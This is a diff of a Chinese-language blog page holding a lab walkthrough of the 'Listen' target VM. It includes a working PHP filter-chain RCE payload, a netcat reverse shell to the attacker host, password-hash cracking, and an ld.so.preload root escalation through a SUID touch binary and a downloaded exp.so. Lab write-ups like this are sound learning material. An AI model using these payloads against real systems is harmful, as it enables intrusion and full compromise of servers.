@@ -7,18 +7,16 @@
     <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
     <script src='https://7r1UMPH.github.io/plugins/theme.js'></script>
     <link rel="icon" href="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200557660.ico">
-<meta name="description" content="# Listen
-
-# 0.简介
+<meta name="description" content="# 0.简介
 
 这是一个群友的靶机，我不知道他发不发布，所以就看看吧，学习学习
 
-**目标 IP**：192.168.205.137  
-**本机 IP**：192.168.205.128
+目标 IP：192.168.205.137
+ 本机 IP：192.168.205.128
 
 # 1.扫描
 
-​`nmap`​起手
+nmap起手
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -55,7 +53,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
 
 # 2.踩点
 
-![image](assets/image-20250203131735-r28u372.png)
+![image-20250331190947415](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190947584.png)
 
 测文件包含，测完了也没结果，所以来个目录爆破先
 
@@ -89,7 +87,6 @@ by Ben 'epi' Risher 🤓                 ver: 2.11.0
 200      GET        2l        1w       17c http://192.168.205.137/tools.php
 200      GET        1l        3w      228c http://192.168.205.137/README.md
 200      GET        2l        1w       15c http://192.168.205.137/pp.php
-
 ```
 
 探索一下
@@ -115,18 +112,16 @@ by Ben 'epi' Risher 🤓                 ver: 2.11.0
 └─$ curl http://192.168.205.137/README.md
 2025年1月22日　本プロジェクトの開発は一旦ここで終了です。">
 <meta property="og:title" content="Listen">
-<meta property="og:description" content="# Listen
-
-# 0.简介
+<meta property="og:description" content="# 0.简介
 
 这是一个群友的靶机，我不知道他发不发布，所以就看看吧，学习学习
 
-**目标 IP**：192.168.205.137  
-**本机 IP**：192.168.205.128
+目标 IP：192.168.205.137
+ 本机 IP：192.168.205.128
 
 # 1.扫描
 
-​`nmap`​起手
+nmap起手
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -163,7 +158,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
 
 # 2.踩点
 
-![image](assets/image-20250203131735-r28u372.png)
+![image-20250331190947415](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190947584.png)
 
 测文件包含，测完了也没结果，所以来个目录爆破先
 
@@ -197,7 +192,6 @@ by Ben 'epi' Risher 🤓                 ver: 2.11.0
 200      GET        2l        1w       17c http://192.168.205.137/tools.php
 200      GET        1l        3w      228c http://192.168.205.137/README.md
 200      GET        2l        1w       15c http://192.168.205.137/pp.php
-
 ```
 
 探索一下
@@ -292,13 +286,12 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><h1>Listen</h1>
-<h1>0.简介</h1>
+<div class="markdown-body" id="postBody"><h1>0.简介</h1>
 <p>这是一个群友的靶机，我不知道他发不发布，所以就看看吧，学习学习</p>
-<p><strong>目标 IP</strong>：192.168.205.137<br>
-<strong>本机 IP</strong>：192.168.205.128</p>
+<p>目标 IP：192.168.205.137<br>
+本机 IP：192.168.205.128</p>
 <h1>1.扫描</h1>
-<p>​<code class="notranslate">nmap</code>​起手</p>
+<p>nmap起手</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nmap -A -Pn -n --min-rate 10000 192.168.205.137
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 13:15 CST
@@ -331,7 +324,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
                                                                 
 </code></pre>
 <h1>2.踩点</h1>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250203131735-r28u372.png"><img src="assets/image-20250203131735-r28u372.png" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/07671824aa190d61f46f91c131a9b13ac50bc092fb5735a58225e97716bb0db2/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303934373538342e706e67"><img src="https://camo.githubusercontent.com/07671824aa190d61f46f91c131a9b13ac50bc092fb5735a58225e97716bb0db2/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303934373538342e706e67" alt="image-20250331190947415" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190947584.png" style="max-width: 100%;"></a></p>
 <p>测文件包含，测完了也没结果，所以来个目录爆破先</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ feroxbuster -u http://192.168.205.137 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
@@ -362,7 +355,6 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 200      GET        2l        1w       17c http://192.168.205.137/tools.php
 200      GET        1l        3w      228c http://192.168.205.137/README.md
 200      GET        2l        1w       15c http://192.168.205.137/pp.php
-
 </code></pre>
 <p>探索一下</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
@@ -413,20 +405,18 @@ trycm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc
 <p>有回显，所以测一下php filter</p>
 <pre class="notranslate"><code class="notranslate">http://192.168.205.137/pp.php?do=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=id
 </code></pre>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250203132831-rph10bg.png"><img src="assets/image-20250203132831-rph10bg.png" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fccb50e56f69a7c4dc2e04b56e8c6b2c6a8227f85e6b1e08ef7c2e6a025854fe/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303935383737352e706e67"><img src="https://camo.githubusercontent.com/fccb50e56f69a7c4dc2e04b56e8c6b2c6a8227f85e6b1e08ef7c2e6a025854fe/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303935383737352e706e67" alt="image-20250331190958726" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190958775.png" style="max-width: 100%;"></a></p>
 <p>弹shell</p>
 <pre class="notranslate"><code class="notranslate">http://192.168.205.137/pp.php?do=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=nc%20192.168.205.128%208888%20-e%20/bin/bash
-</code></pre>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8888                                
 listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.137] 50510
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-
 </code></pre>
 <h1>3. 获得稳定的 Shell</h1>
-<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
+<p>获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
 ctrl+z  
 stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
@@ -455,7 +445,6 @@ drwxr-xr-x 3 root     root     4096 Jan  7 23:52 ..
 -rw-r--r-- 1 root     root      153 Feb  1 09:37 tools.php
 www-data@listen:~/html/wordpress$ cat .2024_12_25_project_web_login_password.bak
 pbkdf2:sha256:50000:flower:0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028
-
 </code></pre>
 <p>看样子要破解这个hash</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
@@ -508,8 +497,7 @@ if __name__ == '__main__':
   
     crack_pbkdf2_hash(target_hash, salt)
                                                        
-</code></pre>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+┌──(kali㉿kali)-[~/test]
 └─$ python3 tmp.py
 找到密码: ['roseflower']
                                                                                                                                      
@@ -528,7 +516,6 @@ www-data@listen:~/html/wordpress$ su - welcome
 Password: 
 $ id                                                                                                                                 
 uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)
-
 </code></pre>
 <p>继续</p>
 <pre class="notranslate"><code class="notranslate">welcome@listen:~$ ls -al
@@ -564,10 +551,9 @@ welcome@listen:~$ find / -perm -4000 -type f 2&gt;/dev/null
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/openssh/ssh-keysign
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-
 </code></pre>
 <p>/usr/bin/touch是多的，找一下怎么提权吧，找半天也找不到，我就等群u的wp了</p>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250203165648-chfb9n8.png"><img src="assets/image-20250203165648-chfb9n8.png" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/1eff76b3da8f2f4c52ff4f724e821d1efc0a9fa312f716e16c6ce426add61eeb/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139313032333733382e706e67"><img src="https://camo.githubusercontent.com/1eff76b3da8f2f4c52ff4f724e821d1efc0a9fa312f716e16c6ce426add61eeb/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139313032333733382e706e67" alt="image-20250331191023675" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191023738.png" style="max-width: 100%;"></a></p>
 <p>过修改 /etc/ld.so.preload 文件实现获得 root 权限，我们跟着实现一下</p>
 <p>查看一下touch命令的so的跟踪流</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
@@ -582,7 +568,6 @@ openat(AT_FDCWD, "/usr/share/locale/zh_CN.UTF-8/LC_MESSAGES/coreutils.mo", O_RDO
 openat(AT_FDCWD, "/usr/share/locale/zh_CN.utf8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (没有那个文件或目录)
 openat(AT_FDCWD, "/usr/share/locale/zh_CN/LC_MESSAGES/coreutils.mo", O_RDONLY) = 3
 openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache", O_RDONLY|O_CLOEXEC) = 3
-
 </code></pre>
 <p>/etc/ld.so.preload 是缺失的，我们去靶机看看</p>
 <pre class="notranslate"><code class="notranslate">welcome@listen:~$ ls -la /etc/ld.so.preload                                                                                          
@@ -617,9 +602,7 @@ void _init() {
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.205.141 - - [03/Feb/2025 17:31:20] "GET /exp.so HTTP/1.1" 200 -
-
-</code></pre>
-<pre class="notranslate"><code class="notranslate">welcome@listen:/tmp$ wget 192.168.205.128/exp.so
+welcome@listen:/tmp$ wget 192.168.205.128/exp.so
 --2025-02-03 04:31:04--  http://192.168.205.128/exp.so
 Connecting to 192.168.205.128:80... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -639,8 +622,8 @@ welcome@listen:/tmp$ echo "/tmp/exp.so" &gt; /etc/ld.so.preload
 welcome@listen:/tmp$ touch test
 root@listen:/tmp# id
 uid=0(root) gid=0(root) groups=0(root),1001(welcome)
-
-</code></pre></div>
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
